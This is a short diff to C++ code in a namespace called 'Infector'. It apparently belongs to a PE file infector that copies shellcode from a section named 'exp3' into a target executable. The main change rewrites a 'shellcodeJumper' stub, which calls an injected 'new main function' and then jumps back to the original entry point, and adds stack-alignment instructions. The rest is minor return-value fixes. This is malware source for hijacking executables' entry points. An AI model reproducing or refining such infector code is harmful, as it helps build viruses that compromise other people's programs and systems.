@@ -137,6 +137,7 @@ namespace Infector
             }
             else
             {
+
                 return false;
             }
         }
@@ -147,6 +148,8 @@ namespace Infector
             *buffer = custom_std::malloc(pCurrentSection->SizeOfRawData);
 
             custom_std::memcpy(*buffer, reinterpret_cast<void*>(pModule + pCurrentSection->VirtualAddress), *bufferSize);
+            return true;
+
         }
 
     }
@@ -294,11 +297,13 @@ namespace Infector
 
         unsigned char sectionName[] = { 'e', 'x', 'p', '3', '\x00' };
 
-        unsigned char shellcodeJumper[11];
-        shellcodeJumper[0] = 0xE8; // CALL REL
-        *reinterpret_cast<DWORD*>(&shellcodeJumper[1]) = 0x01234567; // Relative address of new main function
-        shellcodeJumper[sizeof(DWORD) + 1] = 0xE9; // JMP REL
-        *reinterpret_cast<DWORD*>(&shellcodeJumper[sizeof(DWORD) + 2]) = 0x89ABCDEF; // Relative address of old main function
+        unsigned char shellcodeJumper[13];
+        shellcodeJumper[0] = 0x50; // PUSH RAX - TO ALIGN STACK TO 16
+        shellcodeJumper[1] = 0xE8; // CALL REL
+        *reinterpret_cast<DWORD*>(&shellcodeJumper[2]) = 0x01234567; // Relative address of new main function
+        shellcodeJumper[sizeof(DWORD) + 2] = 0x58; // POP EAX - TO REARENGE THE STACK FRAME BACK
+        shellcodeJumper[sizeof(DWORD) + 3] = 0xE9; // JMP REL
+        *reinterpret_cast<DWORD*>(&shellcodeJumper[sizeof(DWORD) + 4]) = 0x89ABCDEF; // Relative address of old main function
 
         if (!GetExecutableShellcodeDataToInject(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &sectionData, &sectionDataSize))
         {
@@ -320,6 +325,7 @@ namespace Infector
         {
             return false;
         }
+
 
         return true;
     }
